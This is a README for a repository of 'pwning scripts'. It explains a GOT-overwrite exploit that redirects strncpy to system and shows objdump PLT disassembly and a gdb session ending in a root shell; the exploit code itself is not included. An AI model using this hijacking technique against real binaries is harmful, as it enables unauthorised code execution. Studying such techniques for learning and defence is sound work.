# how_to_pwn
Collection of pwning scripts

# How to pwn the system using GOT tables
* got_pwn.c contains code for pwning system using GOT tables.
* Run objdump -d <exec> to figure out GOT offset entries for strncpy & system.
* If pwning is successful, the script will drop you to a shell
  
# Example o/p
```
Disassembly of section .plt:

0000000000400570 <strncpy@plt-0x10>:
  400570:       ff 35 92 0a 20 00       pushq  0x200a92(%rip)        # 601008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400576:       ff 25 94 0a 20 00       jmpq   *0x200a94(%rip)        # 601010 <_GLOBAL_OFFSET_TABLE_+0x10>
  40057c:       0f 1f 40 00             nopl   0x0(%rax)

0000000000400580 <strncpy@plt>:
  400580:       ff 25 92 0a 20 00       jmpq   *0x200a92(%rip)        # 601018 <_GLOBAL_OFFSET_TABLE_+0x18>
  400586:       68 00 00 00 00          pushq  $0x0
  40058b:       e9 e0 ff ff ff          jmpq   400570 <_init+0x20>

0000000000400590 <puts@plt>:
  400590:       ff 25 8a 0a 20 00       jmpq   *0x200a8a(%rip)        # 601020 <_GLOBAL_OFFSET_TABLE_+0x20>
  400596:       68 01 00 00 00          pushq  $0x1
  40059b:       e9 d0 ff ff ff          jmpq   400570 <_init+0x20>

00000000004005a0 <__stack_chk_fail@plt>:
  4005a0:       ff 25 82 0a 20 00       jmpq   *0x200a82(%rip)        # 601028 <_GLOBAL_OFFSET_TABLE_+0x28>
  4005a6:       68 02 00 00 00          pushq  $0x2
  4005ab:       e9 c0 ff ff ff          jmpq   400570 <_init+0x20>

00000000004005b0 <system@plt>:
  4005b0:       ff 25 7a 0a 20 00       jmpq   *0x200a7a(%rip)        # 601030 <_GLOBAL_OFFSET_TABLE_+0x30>
  4005b6:       68 03 00 00 00          pushq  $0x3
  4005bb:       e9 b0 ff ff ff          jmpq   400570 <_init+0x20>

ubuntu:~/got]# gdb ./main1
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./main1...done.
(gdb) r
Starting program: /root/got/main1
strcpy_plt addr :0x400580
GOT=0x600e28, &GOT=0x200895
strcpy@plt:0x600e40
Address at strcpy:0x400550
Hello!/bin/sh
Enter address of strncpy@plt
0x601018
Enter address of system@plt
0x601030
#
# ls
heapexecute.c  main  main1  main.c  Makefile  signal  signal.c	vnag  vnag2
#
```
